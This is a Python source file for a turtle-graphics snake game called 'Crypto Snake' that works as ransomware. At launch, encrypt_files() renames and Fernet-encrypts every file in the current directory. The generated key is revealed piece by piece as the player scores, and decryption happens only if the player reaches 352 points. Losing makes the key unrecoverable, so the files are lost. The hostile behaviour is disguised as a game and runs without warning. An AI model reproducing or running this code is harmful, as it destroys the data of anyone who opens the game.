import os
import turtle
import random
import cryptography as cryptography
import cryptography.fernet

# Config
w = 500
h = 500
food_size = 14
delay = 106
ignore = ["snake.py",".idea","venv"]
shrink_nr = [32, 64, 96, 128, 160, 192, 224, 256, 288, 320]
colors = ["red", "blue", "green", "purple", "orange"]
shapes = ["circle", "triangle", "square"]

# Initiating variables
prompt = turtle.Turtle()
key_print = turtle.Turtle()
point_counter = 0
key = ""
key_value = ""
raw_key = ""
print_init = 0
total_key = ""
snake = ""
old_files = []
new_files = []

offsets = {
    "up": (0, 20),
    "down": (0, -20),
    "left": (-20, 0),
    "right": (20, 0)
}


def reset():
    init_prompt()
    global snake, snake_dir, food_position, pen, delay, point_counter, food_size
    snake = [[0, 0], [0, 20], [0, 40], [0, 60], [0, 80]]
    snake_dir = "up"
    delay = 100
    food_size = 18
    food.shapesize(food_size / 20)
    food_position = get_random_food_position()
    food.goto(food_position)
    move_snake()


def move_snake():
    global snake_dir
    if point_counter == 352:
        victory()
    else:
        new_head = snake[-1].copy()
        new_head[0] = snake[-1][0] + offsets[snake_dir][0]
        new_head[1] = snake[-1][1] + offsets[snake_dir][1]

        if new_head in snake[:-1]:
            lose()
        else:
            snake.append(new_head)

            if not food_collision():
                snake.pop(0)

            if snake[-1][0] > w / 2:
                snake[-1][0] -= w
            elif snake[-1][0] < - w / 2:
                snake[-1][0] += w
            elif snake[-1][1] > h / 2:
                snake[-1][1] -= h
            elif snake[-1][1] < -h / 2:
                snake[-1][1] += h

            pen.clearstamps()

            for segment in snake:
                pen.goto(segment[0], segment[1])
                pen.stamp()

            screen.update()

            turtle.ontimer(move_snake, delay)


def food_collision():
    global food_position, delay, point_counter
    if get_distance(snake[-1], food_position) < 20:
        food_position = get_random_food_position()
        food.goto(food_position)
        update_score("add")
        if point_counter < shrink_nr[-1]:
            delay = delay - 2
        else:
            delay = delay - 2
        if any(x == point_counter for x in shrink_nr):
            modify_food()
        add_key_piece()
        return True
    return False


def update_score(x):
    global point_counter, prompt
    if x == "add":
        prompt.clear()
        point_counter = point_counter + 8
    else:
        prompt.clear()
        point_counter = 0
    prompt.write(str(point_counter) + message, font=("Arial", 16, "normal"), move=False, align="center")


def get_random_food_position():
    x = random.randint(- w / 2 + food_size, w / 2 - food_size)
    y = random.randint(- h / 2 + food_size, h / 2 - food_size)
    return (x, y)


def get_distance(pos1, pos2):
    x1, y1 = pos1
    x2, y2 = pos2
    distance = ((y2 - y1) ** 2 + (x2 - x1) ** 2) ** 0.5
    return distance


def go_up():
    global snake_dir
    if snake_dir != "down":
        snake_dir = "up"


def go_right():
    global snake_dir
    if snake_dir != "left":
        snake_dir = "right"


def go_down():
    global snake_dir
    if snake_dir != "up":
        snake_dir = "down"


def go_left():
    global snake_dir
    if snake_dir != "right":
        snake_dir = "left"


def init_prompt():
    global prompt, point_counter
    prompt.hideturtle()
    prompt.speed(10)
    prompt.goto(0, 210)
    prompt.clear()
    point_counter = 0
    prompt.write(str(point_counter) + message, font=("Arial", 16, "normal"), move=False, align="center")


def init_key_print():
    global key_print, key
    generate_crypto_key()
    key_print.hideturtle()
    key_print.hideturtle()
    key_print.speed(10)
    key_print.goto(0, -210)
    key_print.clear()


def modify_food():
    global food_size, colors, point_counter, shapes
    food_size = food_size - 1
    food.shapesize(food_size / 20)
    if point_counter < 240:
        food.color(random.choice(colors))
        food.shape(random.choice(shapes))
    else:
        food.color("yellow")
        food.shape("square")


def add_key_piece():
    global print_init, total_key
    total_key += key[print_init]
    key_print.clear()
    key_print.write(total_key, font=("Arial", 13, "normal"), move=False, align="center")
    print_init = print_init + 1


def generate_crypto_key():
    global key_value_str, key, raw_key
    key_value = cryptography.fernet.Fernet.generate_key()
    raw_key = cryptography.fernet.Fernet(key_value)
    key = key_value.decode()


def victory():
    global snake, colors
    prompt.clear()
    prompt.goto(0, 180)
    prompt.write(str(point_counter) + message + "\nCongrats! You can get your key in the console :]",
                 font=("Arial", 16, "normal"), move=False, align="center")
    print("Congrats! Here is your decrypt key: \n" + key)
    decrypt_files()


def lose():
    prompt.clear()
    prompt.goto(0, 180)
    prompt.write(str(point_counter) + message + "\nYou loose! The key is gone :[",
                 font=("Arial", 16, "normal"), move=False, align="center")


def encrypt_files():
    global files, key_value, raw_key
    for file in os.listdir():
        if file in ignore:
            continue
        if os.path.isfile(file):
            old_files.append(file)
    for file in old_files:
        new_file = file + ".snake"
        new_files.append(new_file)
        os.rename(file, new_file)
        with open(new_file, "rb") as thefile:
            contents = thefile.read()
            contents_encrypted = cryptography.fernet.Fernet(key).encrypt(contents)
        with open(new_file, "wb") as thefile:
            thefile.write(contents_encrypted)


def decrypt_files():
    global raw_key, key
    count = 0
    for file in os.listdir():
        if file == "snake.py" or file == ".idea" or file == "venv":
            continue
    for file in new_files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
            contents_decrypted = cryptography.fernet.Fernet(key).decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_decrypted)
        os.rename(file, old_files[count])
        count = count + 1


screen = turtle.Screen()
screen.setup(w, h)
screen.title("Crypto Snake")
screen.bgcolor("white")
screen.setup(w, h)
screen.tracer(0)

pen = turtle.Turtle("square")
pen.penup()

food = turtle.Turtle()
food.shape("square")
food.color("yellow")
food.shapesize(food_size / 20)
food.penup()

screen.listen()
screen.onkey(go_up, "Up")
screen.onkey(go_right, "Right")
screen.onkey(go_down, "Down")
screen.onkey(go_left, "Left")

init_key_print()
encrypt_files()
message = " - " + str(len(key) * 8) + " bits"
reset()
turtle.done()
